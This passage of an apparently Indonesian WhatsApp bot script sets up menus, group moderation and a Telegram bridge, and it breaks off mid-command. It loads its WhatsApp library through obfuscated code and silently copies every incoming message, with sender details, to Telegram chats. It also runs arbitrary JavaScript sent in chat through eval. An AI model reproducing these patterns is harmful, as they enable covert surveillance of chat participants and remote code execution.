const fs     = require('fs');
const axios  = require('axios');
const path   = require('path');
const moment = require("moment-timezone");
const crypto = require('crypto');
const dns    = require('dns').promises;
const _0x764f8d=_0x10c4;function _0x10c4(_0x1b145b,_0x2b1d31){_0x1b145b=_0x1b145b-(-0xb47*0x1+0xa*-0x38f+0x49*0xaa);const _0x52f96c=_0x4550();let _0x6a144c=_0x52f96c[_0x1b145b];return _0x6a144c;}function _0x4550(){const _0x43e945=['1602SbVMvI','1995apYxCy','4416384OWNJrQ','@zeppelior','1241307NcSbxw','461CuxiQA','10ENNiUu','g/wbails','3842696ykmlJG','1868377drmGBO','6598OSNJgu','2606082TVeSqc'];_0x4550=function(){return _0x43e945;};return _0x4550();}(function(_0x359244,_0x5864e8){const _0x1becdb=_0x10c4,_0x4fac5d=_0x359244();while(!![]){try{const _0x270ccb=-parseInt(_0x1becdb(0x1a2))/(-0x111c+0x19ef+-0x8d2)*(parseInt(_0x1becdb(0x1a7))/(0x4*-0x66e+0x43f*0x4+-0x2*-0x45f))+parseInt(_0x1becdb(0x1a8))/(0xb*-0x257+0xed9+-0xae7*-0x1)+parseInt(_0x1becdb(0x1a5))/(0x1c80+-0x7dc*-0x1+0x2*-0x122c)+parseInt(_0x1becdb(0x19e))/(0x12c5+-0x247f+0x3b*0x4d)*(-parseInt(_0x1becdb(0x19d))/(-0x147f+-0x23*0x72+0x241b))+parseInt(_0x1becdb(0x1a6))/(-0x1e5a+-0xf*0x221+0x8*0x7ca)+parseInt(_0x1becdb(0x19f))/(0x10bd+-0x2*-0x6ad+-0x1e0f)+-parseInt(_0x1becdb(0x1a1))/(0x2*-0x11fc+0x8c5+0x1b3c)*(parseInt(_0x1becdb(0x1a3))/(-0xb11+-0x1fa6+0x37*0xc7));if(_0x270ccb===_0x5864e8)break;else _0x4fac5d['push'](_0x4fac5d['shift']());}catch(_0xcd7a25){_0x4fac5d['push'](_0x4fac5d['shift']());}}}(_0x4550,-0x1703e3+0xb9a3a+0x18e301));const {default:makeWASocket,proto,generateWAMessage,generateWAMessageFromContent,getContentType,prepareWAMessageMedia}=require(_0x764f8d(0x1a0)+_0x764f8d(0x1a4));
// ╔══════════════════════════════════════════════════════════════╗
// ║                    STATE GLOBAL BOT                         ║
// ╚══════════════════════════════════════════════════════════════╝
const startTime  = Date.now();
let isBotMuted   = false;
let botMode      = "public";
let autoRead     = false;
let autoTyping   = false;
let welcomeOn    = false;
let antilink     = false;
let spamLimit    = 2000;

const antiSpam   = new Map();
const warnMap    = new Map();
const notes      = new Map();
const mutedUsers = new Map();
const roleDB     = new Map();
const savedFiles = new Map(); // nama file → Buffer

// ╔══════════════════════════════════════════════════════════════╗
// ║                  PERSIST: botstate.json                     ║
// ╚══════════════════════════════════════════════════════════════╝
const statePath = './library/botstate.json';
const loadState = () => {
  try {
    const s = JSON.parse(fs.readFileSync(statePath));
    isBotMuted = s.isBotMuted ?? false;
    botMode    = s.botMode    ?? "public";
    autoRead   = s.autoRead   ?? false;
    autoTyping = s.autoTyping ?? false;
    welcomeOn  = s.welcomeOn  ?? false;
    antilink   = s.antilink   ?? false;
    spamLimit  = s.spamLimit  ?? 2000;
    if (s.mutedUsers) {
      for (const [k, v] of Object.entries(s.mutedUsers)) mutedUsers.set(k, new Set(v));
    }
    if (s.roleDB) {
      for (const [k, v] of Object.entries(s.roleDB)) roleDB.set(k, v);
    }
  } catch { /* pakai default */ }
};
const saveState = () => {
  try {
    if (!fs.existsSync('./library')) fs.mkdirSync('./library', { recursive: true });
    const mutedSerial = {};
    for (const [k, v] of mutedUsers.entries()) mutedSerial[k] = [...v];
    const roleSerial = {};
    for (const [k, v] of roleDB.entries()) roleSerial[k] = v;
    fs.writeFileSync(statePath, JSON.stringify({
      isBotMuted, botMode, autoRead, autoTyping, welcomeOn, antilink, spamLimit,
      mutedUsers: mutedSerial, roleDB: roleSerial
    }, null, 2));
  } catch (e) { console.error("saveState error:", e.message); }
};
loadState();

// ╔══════════════════════════════════════════════════════════════╗
// ║              TELEGRAM MULTI-BOT BRIDGE                      ║
// ╚══════════════════════════════════════════════════════════════╝
const tgPath  = './library/telegram.json';
let tgBots    = [];
let tgPollers = {};

const loadTgBots = () => {
  try {
    const raw = JSON.parse(fs.readFileSync(tgPath));
    if (raw.bots) tgBots = raw.bots;
    else if (raw.token) tgBots = [{ id: 1, token: raw.token, chatId: raw.chatId || null, mirror: raw.mirror || false, mirrorTarget: raw.mirrorTarget || null, label: "Bot 1" }];
  } catch { tgBots = []; }
};
const saveTgBots = () => {
  try {
    if (!fs.existsSync('./library')) fs.mkdirSync('./library', { recursive: true });
    fs.writeFileSync(tgPath, JSON.stringify({ bots: tgBots }, null, 2));
  } catch {}
};
loadTgBots();

const tgCall = async (token, method, params = {}) => {
  if (!token) return null;
  try {
    const res = await axios.post(`https://api.telegram.org/bot${token}/${method}`, params, { timeout: 10000 });
    return res.data;
  } catch { return null; }
};

const tgBroadcastAll = async (text) => {
  for (const bot of tgBots) {
    if (bot.token && bot.chatId) await tgCall(bot.token, "sendMessage", { chat_id: bot.chatId, text, parse_mode: "Markdown" });
  }
};

const startBotPolling = (bot, WaSock) => {
  if (tgPollers[bot.id]) return;
  let offset = 0;
  tgPollers[bot.id] = setInterval(async () => {
    const data = await tgCall(bot.token, "getUpdates", { offset, timeout: 5 });
    if (!data || !data.ok) return;
    for (const upd of data.result) {
      offset = upd.update_id + 1;
      const msg = upd.message || upd.channel_post;
      if (!msg || !msg.text) continue;
      const txt = msg.text.trim();
      const cid = String(msg.chat.id);
      if (!bot.chatId) { bot.chatId = cid; saveTgBots(); }
      if (bot.mirror && bot.chatId === cid && bot.mirrorTarget) {
        await WaSock.sendMessage(bot.mirrorTarget, { text: `📨 *[TG Bridge — ${bot.label}]*\n${msg.from?.first_name || "User"}: ${txt}` }).catch(() => {});
      }
      if (bot.chatId !== cid || !txt.startsWith('!')) continue;
      const tgParts = txt.slice(1).trim().split(' ');
      const tgCmd   = tgParts[0].toLowerCase();
      const tgArgs  = tgParts.slice(1).join(' ');
      switch (tgCmd) {
        case 'help': await tgCall(bot.token, "sendMessage", { chat_id: cid, parse_mode: "Markdown", text: `📋 *${bot.label} — Commands*\n\n!status !mute !unmute !private !public\n!bc [pesan] !send [jid] [pesan]\n!listgroup !groupbc [jid] [pesan]\n!restart !mirror on/off !setchat !info !uptime !notes !muted` }); break;
        case 'status': await tgCall(bot.token, "sendMessage", { chat_id: cid, parse_mode: "Markdown", text: `🤖 *Bot WA*\nMute: ${isBotMuted}\nMode: ${botMode}\nAutoRead: ${autoRead}\nWelcome: ${welcomeOn}\nAntilink: ${antilink}` }); break;
        case 'uptime': await tgCall(bot.token, "sendMessage", { chat_id: cid, parse_mode: "Markdown", text: `⏳ *Uptime*\nAktif: ${Math.floor((Date.now()-startTime)/60000)} menit` }); break;
        case 'info': await tgCall(bot.token, "sendMessage", { chat_id: cid, parse_mode: "Markdown", text: `🤖 *${bot.label}*\nChatID: ${bot.chatId||'-'}\nMirror: ${bot.mirror?'ON':'OFF'}\nTarget: ${bot.mirrorTarget||'-'}` }); break;
        case 'mute': isBotMuted = true; saveState(); await tgCall(bot.token, "sendMessage", { chat_id: cid, text: "🔇 Bot WA di-mute!" }); break;
        case 'unmute': isBotMuted = false; saveState(); await tgCall(bot.token, "sendMessage", { chat_id: cid, text: "🔊 Bot WA aktif!" }); break;
        case 'private': botMode = "private"; saveState(); await tgCall(bot.token, "sendMessage", { chat_id: cid, text: "🔒 Mode private!" }); break;
        case 'public': botMode = "public"; saveState(); await tgCall(bot.token, "sendMessage", { chat_id: cid, text: "🌐 Mode public!" }); break;
        case 'notes': {
          if (notes.size === 0) { await tgCall(bot.token, "sendMessage", { chat_id: cid, text: "📋 Belum ada catatan." }); break; }
          const nl = [...notes.entries()].map(([k,v],i)=>`${i+1}. *${k}*\n   ${v.val}`).join('\n\n');
          await tgCall(bot.token, "sendMessage", { chat_id: cid, parse_mode: "Markdown", text: `📋 *Catatan WA*\n\n${nl}` }); break;
        }
        case 'muted': {
          const gs = mutedUsers.get("global");
          const ml = gs && gs.size > 0 ? [...gs].map((j,i)=>`${i+1}. ${j.split('@')[0]}`).join('\n') : "Tidak ada.";
          await tgCall(bot.token, "sendMessage", { chat_id: cid, parse_mode: "Markdown", text: `🔇 *Muted Users*\n\n${ml}` }); break;
        }
        case 'send': {
          const sP = tgArgs.split(' '); const sJid = sP[0]; const sPesan = sP.slice(1).join(' ');
          if (!sJid || !sPesan) { await tgCall(bot.token, "sendMessage", { chat_id: cid, text: "❌ !send [jid] [pesan]" }); break; }
          await WaSock.sendMessage(sJid, { text: sPesan }).catch(()=>{});
          await tgCall(bot.token, "sendMessage", { chat_id: cid, text: `✅ Terkirim ke ${sJid}` }); break;
        }
        case 'listgroup': {
          const allG = await WaSock.groupFetchAllParticipating().catch(()=>({}));
          const names = Object.values(allG).map((g,i)=>`${i+1}. ${g.subject} — \`${g.id}\``).join('\n');
          await tgCall(bot.token, "sendMessage", { chat_id: cid, parse_mode: "Markdown", text: `🏠 *Grup WA*\n\n${names||"Tidak ada"}\nTotal: ${Object.keys(allG).length}` }); break;
        }
        case 'mirror': bot.mirror = tgArgs === 'on'; saveTgBots(); await tgCall(bot.token, "sendMessage", { chat_id: cid, text: `Mirror: ${bot.mirror?"✅ ON":"❌ OFF"}` }); break;
        case 'setchat': bot.chatId = cid; saveTgBots(); await tgCall(bot.token, "sendMessage", { chat_id: cid, parse_mode: "Markdown", text: `✅ Chat ini jadi target *${bot.label}*!` }); break;
        case 'restart': await tgCall(bot.token, "sendMessage", { chat_id: cid, text: "🔄 Restart..." }); setTimeout(()=>process.exit(0),1500); break;
        default: await tgCall(bot.token, "sendMessage", { chat_id: cid, text: "❓ Tidak dikenal. Kirim !help" });
      }
    }
  }, 2500);
};

const stopBotPolling = (botId) => { if (tgPollers[botId]) { clearInterval(tgPollers[botId]); delete tgPollers[botId]; } };
const stopAllPolling = () => { for (const id of Object.keys(tgPollers)) stopBotPolling(id); };

// ── Helpers ───────────────────────────────────────────────────
const fmtBytes = (b) => {
  if (b < 1024) return `${b} B`;
  if (b < 1048576) return `${(b/1024).toFixed(1)} KB`;
  if (b < 1073741824) return `${(b/1048576).toFixed(1)} MB`;
  return `${(b/1073741824).toFixed(2)} GB`;
};
const cleanDomain = (str) => {
  if (!str) return '';
  return str.replace(/^https?:\/\//,'').replace(/^www\./,'').split('/')[0].split('?')[0];
};

// ╔══════════════════════════════════════════════════════════════╗
// ║                    MODULE EXPORT                            ║
// ╚══════════════════════════════════════════════════════════════╝
module.exports = WaSocket = async (WaSocket, m, chatUpdate, store) => {

  const body = m.message ? (
    m.mtype === "conversation"               ? m.message.conversation :
    m.mtype === "imageMessage"               ? (m.message.imageMessage?.caption || "") :
    m.mtype === "videoMessage"               ? (m.message.videoMessage?.caption || "") :
    m.mtype === "extendedTextMessage"        ? (m.message.extendedTextMessage?.text || "") :
    m.mtype === "buttonsResponseMessage"     ? (m.message.buttonsResponseMessage?.selectedButtonId || "") :
    m.mtype === "listResponseMessage"        ? (m.message.listResponseMessage?.singleSelectReply?.selectedRowId || "") :
    m.mtype === "templateButtonReplyMessage" ? (m.message.templateButtonReplyMessage?.selectedId || "") :
    m.mtype === "interactiveResponseMessage" ? (() => { try { return JSON.parse(m.msg?.nativeFlowResponseMessage?.paramsJson || "{}").id || ""; } catch { return ""; } })() :
    m.mtype === "pollUpdateMessage"          ? (m.message.vote?.selectedOptions || "") :
    m.mtype === "messageContextInfo"         ? (m.message.buttonsResponseMessage?.selectedButtonId ||
                                               m.message.listResponseMessage?.singleSelectReply?.selectedRowId || m.text || "") : ""
  ) : "";

  const sender       = m.key.fromMe ? WaSocket.user.id.split(":")[0] || WaSocket.user.id : m.key.participant || m.key.remoteJid;
  const senderNumber = sender ? sender.split('@')[0] : "";
  const budy         = typeof m.text === 'string' ? m.text : '';
  const prefix       = ".";
  const isCmd        = body && body.startsWith(prefix);
  const command      = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : "";
  const args         = body ? body.trim().split(/ +/).slice(1) : [];
  const pushname     = m.pushName || "\0";
  const text = q     = args.join(" ");
const quoted  = m.quoted || m;
const quotedMsg = quoted?.msg || quoted || {};
const mime    = quotedMsg?.mimetype || '';
const isMedia = /image|video|sticker|audio/.test(mime);
  const from         = m.key.remoteJid;
  const isGroup      = from ? from.endsWith("@g.us") : false;
  const botNumber    = await WaSocket.decodeJid(WaSocket.user.id);

  let owners = [];
  try { owners = JSON.parse(fs.readFileSync('./library/owners.json')); } catch { owners = []; }

  const isOwner = [botNumber, ...owners].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);

  const groupMetadata    = isGroup ? await WaSocket.groupMetadata(m.chat).catch(() => null) : null;
  const groupName        = isGroup && groupMetadata ? groupMetadata.subject : "";
  const participants     = isGroup && groupMetadata ? groupMetadata.participants : [];
  const groupAdmins      = isGroup ? participants.filter(v => v.admin !== null).map(v => v.jid) : [];
  const groupMembers     = isGroup && groupMetadata ? groupMetadata.participants : [];
  const isAdmins         = isGroup ? groupAdmins.includes(m.sender) : false;
  const isBotGroupAdmins = isGroup && botNumber ? groupAdmins.includes(botNumber) : false;

  const { smsg, formatSize, isUrl, getBuffer, runtime, fetchJson, sleep } = require('./library/functions');

  let CryskyyLogo;
  try { CryskyyLogo = fs.readFileSync("./CYX.jpg"); } catch { CryskyyLogo = null; }

  const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");
  const date = moment.tz("Asia/Jakarta").format("DD/MM/YYYY");

  const x = {
    key: { participant: "13135550002@s.whatsapp.net", remoteJid: "status@broadcast", fromMe: false },
    message: {
      interactiveResponseMessage: {
        body: { text: "Cryskyy", format: 1 },
        nativeFlowResponseMessage: { name: "galaxy_message", paramsJson: '{"wa_flow_response_params":{"title":"Cryskyy - Aptx"}}', version: 3 }
      }
    }
  };

  const reply = (teks) => {
    const msg = generateWAMessageFromContent(m.chat, {
      interactiveMessage: {
        header: { title: "Cryskyy", hasMediaAttachment: false },
        nativeFlowMessage: { buttons: [{ name: "inapp_signup", buttonParamsJson: "{}" }] },
        body: { text: teks }
      }
    }, { quoted: x });
    return WaSocket.relayMessage(m.chat, msg.message, { quoted: x });
  };

  const formatUptime = (ms) => {
    const s = Math.floor(ms / 1000);
    const d = Math.floor(s/86400), h = Math.floor((s%86400)/3600), mn = Math.floor((s%3600)/60), sc = s%60;
    return [d&&`${d}d`, h&&`${h}h`, mn&&`${mn}m`, `${sc}s`].filter(Boolean).join(' ');
  };

  if (autoRead) await WaSocket.readMessages([m.key]).catch(() => {});
  if (autoTyping && isCmd) await WaSocket.sendPresenceUpdate("composing", m.chat).catch(() => {});

  if (body && !m.key.fromMe) {
    for (const bot of tgBots) {
      if (bot.token && bot.chatId && bot.mirror) {
        await tgCall(bot.token, "sendMessage", {
          chat_id: bot.chatId,
          text: `📱 *[${bot.label}] WA*\n👤 ${pushname} (${senderNumber})\n${isGroup?`🏠 ${groupName}\n`:''}💬 ${body}`,
          parse_mode: "Markdown"
        });
      }
    }
  }

  if (isCmd && !isOwner) {
    if (isBotMuted) return;
    if (botMode === "private") return reply("🔒 Bot sedang *Private Mode*.");
    const globalMuted = mutedUsers.get("global");
    if (globalMuted && globalMuted.has(m.sender)) return;
    const now = Date.now(), last = antiSpam.get(m.sender) || 0;
    if (now - last < spamLimit) return;
    antiSpam.set(m.sender, now);
  }

  if (antilink && isGroup && isBotGroupAdmins && !isAdmins && !isOwner) {
    if (/https?:\/\/|chat\.whatsapp\.com/i.test(body || '')) {
      await WaSocket.sendMessage(from, { delete: m.key }).catch(() => {});
      reply(`⚠️ @${senderNumber} dilarang mengirim link!`);
      return;
    }
  }

  // ── Handle > eval — exec + tampil output ────────────────────
  if (budy.startsWith('>') && !budy.startsWith('=>')) {
    if (!isOwner) return;
    const code = budy.slice(1).trim();
    if (!code) return reply("⚠️ Masukkan kode JS!");
    try {
      let ev = await eval(`(async () => { ${code} })()`);
      if (typeof ev === 'undefined') ev = "✅ Executed (no return)";
      if (typeof ev !== 'string') ev = require('util').inspect(ev, { depth: 3 });
      if (ev.length > 3000) ev = ev.substring(0, 3000) + '\n...(terpotong)';
      reply(ev);
    } catch (err) {
      reply(`❌ *Error*\n${String(err)}`);
    }
    return;
  }

  // ── Handle ^ exec — silent, error baru ke reply ───────────────
  if (budy.startsWith('^')) {
    if (!isOwner) return;
    const code = budy.slice(1).trim();
    if (!code) return;
    try {
      await eval(`(async () => { ${code} })()`);
    } catch (err) {
      reply(`❌ *Exec Error*\n${String(err)}`);
    }
    return;
  }

  // ── Handle => eval — output reply ke quoted ───────────────────
  if (budy.startsWith('=>')) {
    if (!isOwner) return;
    const code = budy.slice(2).trim();
    if (!code) return;
    try {
      let ev = await eval(`(async () => { ${code} })()`);
      if (typeof ev === 'undefined') ev = "✅ Done";
      if (typeof ev !== 'string') ev = require('util').inspect(ev, { depth: 3 });
      if (ev.length > 3000) ev = ev.substring(0, 3000) + '\n...(terpotong)';
      await WaSocket.sendMessage(m.chat, { text: ev }, { quoted: m.quoted || m });
    } catch (err) {
      await WaSocket.sendMessage(m.chat, { text: `❌ *Error*\n${String(err)}` }, { quoted: m.quoted || m });
    }
    return;
  }

  if (!command) return;

  switch (command) {

    // ══════════════════════════════════════════════════════════
    //  MENU
    // ══════════════════════════════════════════════════════════
    case "menu": {
      const tgActive = tgBots.filter(b => b.token).length;
      const menuText =
        `┏━═『 𝐗 | 𝐂𝐫𝐲𝐬𝐤𝐲𝐲 𝐏𝐫𝐨𝐣𝐞𝐜𝐭 』\n` +
        `┃➥ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧  : 𝟏.𝟑.𝟎\n` +
        `┃➥ 𝐖𝐞𝐛     : cryskyydev.biz.id\n` +
        `┃➥ 𝐓𝐢𝐦𝐞    : ${time}  |  ${date}\n` +
        `┃➥ 𝐒𝐭𝐚𝐭𝐮𝐬  : ${isBotMuted ? "🔇 Muted" : "🔊 Active"} | ${botMode === "private" ? "🔒 Private" : "🌐 Public"}\n` +
        `┃➥ 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 : ${tgActive}/${tgBots.length} bot terhubung\n` +
        `┃\n` +
        `┃ 📋 .menu       — Halaman utama\n` +
        `┃ ⚙️ .utils      — Menu utilitas\n` +
        `┃ 🌐 .netmenu    — Network & Web Sec\n` +
        `┃ 📁 .filemenu   — File & Media Tools\n` +
        `┃ 👥 .gbmenu     — Menu grup\n` +
        `┃ 🔒 .ownermenu  — Panel owner\n` +
        `┃ 🤖 .tgmenu     — Telegram Bridge\n` +
        `┃ 🌿 .rolemenu   — Role system\n` +
        `┃ 📊 .stats      — Bot statistics\n` +
        `┗━═━═━═━═━═━═━═𖤻`;
      await WaSocket.sendMessage(m.chat, {
        image: CryskyyLogo, caption: menuText,
        contextInfo: { forwardingScore: 999, isForwarded: true }
      }, { quoted: x });
      break;
    }

    // ══════════════════════════════════════════════════════════
    //  UTILS MENU
    // ══════════════════════════════════════════════════════════
    case "utils": {
      await WaSocket.sendMessage(m.chat, {
        interactiveMessage: {
          image: CryskyyLogo, title: "⚙️ Utils Menu",
          nativeFlowMessage: { buttons: [
            { name: "single_select" },
            { name: "single_select", buttonParamsJson: JSON.stringify({
              icon: "DEFAULT", title: "Utils Menu",
              sections: [
                { title: "📱 Basic Utils", rows: [
                  { title: "🏓 Ping",              id: ".ping"      },
                  { title: "⏳ Uptime",            id: ".uptime"    },
                  { title: "📊 Info Sender",       id: ".info"      },
                  { title: "📊 Bot Stats",         id: ".stats"     },
                  { title: "🚫 Ban Checker",       id: ".checkban"  }
                ]},
                { title: "🎨 Text Converter", rows: [
                  { title: "📡 Morse Code",        id: ".morse"     },
                  { title: "📡 Demorse",           id: ".demorse"   },
                  { title: "✨ Aesthetic Font",    id: ".aesthetic" },
                  { title: "💬 Bubble Font",       id: ".bubble"    },
                  { title: "🔄 ROT13 Cipher",      id: ".rot13"     },
                  { title: "🔐 Caesar Cipher",     id: ".caesar"    },
                  { title: "🔤 Base64 Encode",     id: ".b64enc"    },
                  { title: "🔓 Base64 Decode",     id: ".b64dec"    },
                  { title: "🔠 Reverse Teks",      id: ".reverse"   },
                  { title: "📏 Hitung Karakter",   id: ".charcount" }
                ]},
                { title: "📐 Kalkulator & Konversi", rows: [
                  { title: "🔢 Kalkulator",        id: ".calc"      },
                  { title: "🎰 Random Number",     id: ".random"    },
                  { title: "🌡️ Konversi Suhu",     id: ".suhu"      },
                  { title: "💰 Konversi Kurs",     id: ".kurs"      },
                  { title: "📏 Konversi Angka",    id: ".konversi"  },
                  { title: "⚖️ BMI Kalkulator",    id: ".bmi"       },
                  { title: "💰 Split Bill",        id: ".splitbill" }
                ]},
                { title: "📅 Info & Utilitas", rows: [
                  { title: "📅 Tanggal Sekarang",  id: ".tanggal"   },
                  { title: "⏳ Countdown",          id: ".countdown" },
                  { title: "🎂 Hitung Umur",       id: ".age"       },
                  { title: "♈ Cek Zodiak",         id: ".zodiak"    },
                  { title: "🔑 Generate Password", id: ".genpass"   },
                  { title: "🔒 XOR Encrypt",       id: ".xorenc"    },
                  { title: "🔓 XOR Decrypt",       id: ".xordec"    },
                  { title: "📜 Lorem Ipsum",       id: ".lorem"     },
                  { title: "🍅 Pomodoro Timer",    id: ".pomodoro"  }
                ]},
                { title: "📝 Catatan & Media", rows: [
                  { title: "📝 Simpan Catatan",    id: ".setnote"   },
                  { title: "📖 Lihat Catatan",     id: ".getnote"   },
                  { title: "🗑️ Hapus Catatan",     id: ".delnote"   },
                  { title: "🎵 MP3 → Voice Note",  id: ".mp3"       },
                  { title: "🖼️ Gambar → Sticker",  id: ".sticker"   },
                  { title: "🔁 Sticker → Gambar",  id: ".toimg"     },
                  { title: "🔓 Buka View-Once",    id: ".rvo"       },
                  { title: "📱 Generate QR Code",  id: ".qr"        }
                ]},
                { title: "🌤️ Info Online", rows: [
                  { title: "🌤️ Cek Cuaca",         id: ".cuaca"     },
                  { title: "🎲 Random Quote",      id: ".quote"     },
                  { title: "🔢 Tebak Angka",       id: ".tebak"     }
                ]}
              ]
            })}
          ]}
        }
      }, { quoted: x });
      break;
    }

    // ══════════════════════════════════════════════════════════
    //  NETWORK & WEB MENU
    // ══════════════════════════════════════════════════════════
    case "netmenu": {
      await WaSocket.sendMessage(m.chat, {
        interactiveMessage: {
          image: CryskyyLogo, title: "🌐 Network & Web Tools",
          nativeFlowMessage: { buttons: [
            { name: "single_select" },
            { name: "single_select", buttonParamsJson: JSON.stringify({
              icon: "DEFAULT", title: "Network Tools",
              sections: [
                { title: "🌐 Website Checker", rows: [
                  { title: "🌐 Cek Website Online",   id: ".cekweb"       },
                  { title: "⏱️ Load Time Website",    id: ".loadtime"     },
                  { title: "📦 Page Size Website",    id: ".pagesize"     },
                  { title: "⚡ Response Time API",    id: ".responsetime" },
                  { title: "📋 HTTP Headers",         id: ".header"       },
                  { title: "🔒 SSL Certificate",      id: ".sslcheck"     },
                  { title: "⚡ Bandwidth Test",       id: ".bandwidth"    },
                  { title: "🌐 WebX Scan",            id: ".webx"         }
                ]},
                { title: "🔍 DNS & Domain", rows: [
                  { title: "🔍 DNS Lookup",           id: ".dns"          },
                  { title: "🔄 Reverse DNS",          id: ".rdns"         },
                  { title: "📋 WHOIS Domain",         id: ".whois"        }
                ]},
                { title: "🌍 IP & Network", rows: [
                  { title: "📍 IP Info",              id: ".ipinfo"       },
                  { title: "🏠 IP Saya (My IP)",      id: ".myip"         },
                  { title: "🏓 Ping Host",            id: ".pinghost"     }
                ]}
              ]
            })}
          ]}
        }
      }, { quoted: x });
      break;
    }

    // ══════════════════════════════════════════════════════════
    //  FILE & MEDIA MENU
    // ══════════════════════════════════════════════════════════
    case "filemenu": {
      await WaSocket.sendMessage(m.chat, {
        interactiveMessage: {
          image: CryskyyLogo, title: "📁 File & Media Tools",
          nativeFlowMessage: { buttons: [
            { name: "single_select" },
            { name: "single_select", buttonParamsJson: JSON.stringify({
              icon: "DEFAULT", title: "File Tools",
              sections: [
                { title: "🖼️ Image Tools", rows: [
                  { title: "📊 Image Metadata",       id: ".imgmeta"      },
                  { title: "🗑️ Hapus EXIF Gambar",    id: ".exifrm"       },
                  { title: "📦 Kompres Gambar",       id: ".imgcompress"  }
                ]},
                { title: "🎬 Video & Audio", rows: [
                  { title: "🎬 Video Metadata",       id: ".videometa"    },
                  { title: "🎵 Audio Metadata",       id: ".audiometa"    },
                  { title: "🎥 Kirim PTV (vid1)",     id: ".vid1"         }
                ]},
                { title: "🔐 File Hash", rows: [
                  { title: "🔐 Hitung Hash File",     id: ".filehash"     }
                ]}
              ]
            })}
          ]}
        }
      }, { quoted: x });
      break;
    }

    // ══════════════════════════════════════════════════════════
    //  GROUP MENU
    // ══════════════════════════════════════════════════════════
    case "gbmenu": {
      await WaSocket.sendMessage(m.chat, {
        interactiveMessage: {
          image: CryskyyLogo, title: "👥 Group Menu",
          nativeFlowMessage: { buttons: [
            { name: "single_select" },
            { name: "single_select", buttonParamsJson: JSON.stringify({
              icon: "DEFAULT", title: "Group",
              sections: [{ title: "Cryskyy Project", rows: [
                { title: "ℹ️ Info Grup",            id: ".groupinfo" },
                { title: "🔒 Tutup Grup",           id: ".closegrp"  },
                { title: "🔓 Buka Grup",            id: ".opengrp"   },
                { title: "📝 Set Deskripsi",        id: ".setgdesc"  },
                { title: "👋 Welcome On/Off",       id: ".welcome"   },
                { title: "🔗 Antilink On/Off",      id: ".antilink"  },
                { title: "⚠️ Warn Member",          id: ".warn"      },
                { title: "♻️ Reset Warn",           id: ".resetwarn" },
                { title: "🔇 Mute User",            id: ".mute"      },
                { title: "🔊 Unmute User",          id: ".unmute"    },
                { title: "🚪 Kick Member",          id: ".kick"      },
                { title: "👑 Promote Admin",        id: ".promote"   },
                { title: "👤 Demote Admin",         id: ".demote"    },
                { title: "📢 Tag All Member",       id: ".tagall"    },
                { title: "📣 Hidetag",              id: ".hidetag"   }
              ]}]
            })}
          ]}
        }
      }, { quoted: x });
      break;
    }

    // ══════════════════════════════════════════════════════════
    //  OWNER MENU
    // ══════════════════════════════════════════════════════════
    case "ownermenu": {
      if (!isOwner) { reply("❌ Owner only!"); break; }
      reply(
        `┏━═『 👑 OWNER PANEL 』\n` +
        `┃\n` +
        `┃ 🔇 *Bot Control*\n` +
        `┃--- .mute / .unmute (global atau @tag)\n` +
        `┃--- .listmuted · .private · .public\n` +
        `┃--- .autoread on/off · .autotyping on/off\n` +
        `┃--- .spamdelay [ms] · .clearspam\n` +
        `┃--- .botstatus · .restart · .shutdown\n` +
        `┃\n` +
        `┃ 👤 *Owner Mgmt*\n` +
        `┃--- .addowner · .delowner · .listowner\n` +
        `┃\n` +
        `┃ 🚫 *Block*\n` +
        `┃--- .block · .unblock · .listblock\n` +
        `┃\n` +
        `┃ 🏠 *Grup Control*\n` +
        `┃--- .join [link] · .leave · .listgroup\n` +
        `┃--- .closegrp · .opengrp · .setgdesc\n` +
        `┃\n` +
        `┃ ✏️ *Profile Bot*\n` +
        `┃--- .setname · .setstatus · .setpp\n` +
        `┃\n` +
        `┃ 🎬 *Media Owner*\n` +
        `┃--- .addfl (reply video) — simpan file\n` +
        `┃--- .listfl · .delfl [nama]\n` +
        `┃--- .vid1 [nama] — kirim PTV\n` +
        `┃--- .rc [judul]|[code]|[imgurl]|[link]\n` +
        `┃--- .rq [nomor],[jumlah] — max 20\n` +
        `┃\n` +
        `┃ 🛠️ *Debug*\n` +
        `┃--- > [kode JS sync/async]\n` +
        `┃--- .exc [kode JS async]\n` +
        `┗━═━═━═━═━═━═━═𖤻`
      );
      break;
    }

    // ══════════════════════════════════════════════════════════
    //  TELEGRAM MENU
    // ══════════════════════════════════════════════════════════
    case "tgmenu": {
      if (!isOwner) { reply("❌ Owner only!"); break; }
      const botList = tgBots.length
        ? tgBots.map((b,i) => `┃  ${i+1}. *${b.label}* — ${b.token?"✅":"❌"} | Mirror: ${b.mirror?"ON":"OFF"} | ChatID: ${b.chatId||"-"}`).join('\n')
        : "┃  (belum ada bot)";
      reply(
        `┏━═『 🤖 TELEGRAM BRIDGE 』\n` +
        `┃\n` +
        `┃ 📋 *Daftar Bot*\n` +
        `${botList}\n` +
        `┃\n` +
        `┃ ⚙️ *Commands*\n` +
        `┃--- .tgadd [label]|[token]\n` +
        `┃--- .tgdel [nomor]\n` +
        `┃--- .tglist · .tgstatus [nomor]\n` +
        `┃--- .tgmirror [nomor] on/off\n` +
        `┃--- .tgsettarget [nomor]\n` +
        `┃--- .tgsend [nomor] [pesan]\n` +
        `┃--- .tgbc [pesan]\n` +
        `┃--- .tgdisconnect [nomor]\n` +
        `┃--- .tgstopall\n` +
        `┗━═━═━═━═━═━═━═𖤻`
      );
      break;
    }

    case "rolemenu": {
      reply(
        `┏━═『 🌿 ROLE SYSTEM 』\n` +
        `┃--- .setrole @tag [nama role]\n` +
        `┃--- .delrole @tag\n` +
        `┃--- .listrole\n` +
        `┃--- .myrole\n` +
        `┗━═━═━═━═━═━═━═𖤻`
      );
      break;
    }

    // ══════════════════════════════════════════════════════════
    //  BASIC UTILS
    // ══════════════════════════════════════════════════════════
    case "ping": {
      const t0 = Date.now();
      await WaSocket.readMessages([m.key]);
      const latency = Date.now() - t0;
      reply(`🏓 *Pong!*\n⏱️ *${latency}ms*`);
      break;
    }

    case "uptime": {
      reply(
        `⏳ *Bot Uptime*\n\n` +
        `🕐 Aktif  : *${formatUptime(Date.now()-startTime)}*\n` +
        `📅 Sejak  : ${moment(startTime).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}\n` +
